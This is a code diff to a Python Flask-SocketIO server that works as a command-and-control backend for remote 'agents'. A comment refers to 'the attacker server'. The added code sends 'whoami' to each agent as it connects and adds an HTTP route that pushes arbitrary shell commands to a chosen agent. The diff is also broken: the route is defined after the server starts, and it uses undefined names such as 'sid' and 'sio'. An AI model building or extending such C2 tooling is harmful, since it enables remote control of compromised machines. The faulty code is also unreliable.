@@ -30,15 +30,38 @@ def register():
 @socketio.on('exec_result')
 def handle_result(data):
     # Handle incoming command output from the agent
-    print(f"[{data['id']}] Output:\n{data['output']}")
+#    print(f"[{data['id']}] Output:\n{data['output']}")
+    print(f"[Agent Output] {data['output']}")    
 
 @socketio.on('connect')
-def connect():
+def handle_connect():
+    print("[+] Agent connected:", request.sid)
     # Called when an agent connects
-    print("[+] Agent connected.")
+
+#    agent_sessions[request.sid] = request.sid
+#    agent_sessions['latest'] = request.sid
+
+    # Test: send command directly to agent
+    socketio.emit('command', "whoami", room=request.sid)
 
 if __name__ == "__main__":
     # Start the SocketIO server with SSL support
     # Make sure cert.pem and key.pem are in the same folder
-    # Change the 0.0.0.0 to the IP of the attacker server
-    socketio.run(app, host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
+    socketio.run(app, host='0.0.0.0', port=5000)#, ssl_context=('cert.pem', 'key.pem'))
+
+# === HTTP Route to Send Commands ===
+@app.route('/send/sid', methods=['POST'])
+def send_command(agent_id):
+    data = request.get_json()
+    cmd = data.get('cmd')
+    if agent_id in agent_sessions:
+        socketio.emit('command', cmd, room=sid)
+        print(f"[>] Sent command: {cmd} to agent {sid}")
+        return jsonify({"status": "command sent"}), 200
+    else:
+        return jsonify({"error": "Agent not found"}), 404
+
+@sio.on('output')
+def handle_output(sid, data):
+    print(f"[{sid}] Output:\n{data}")
+                                                
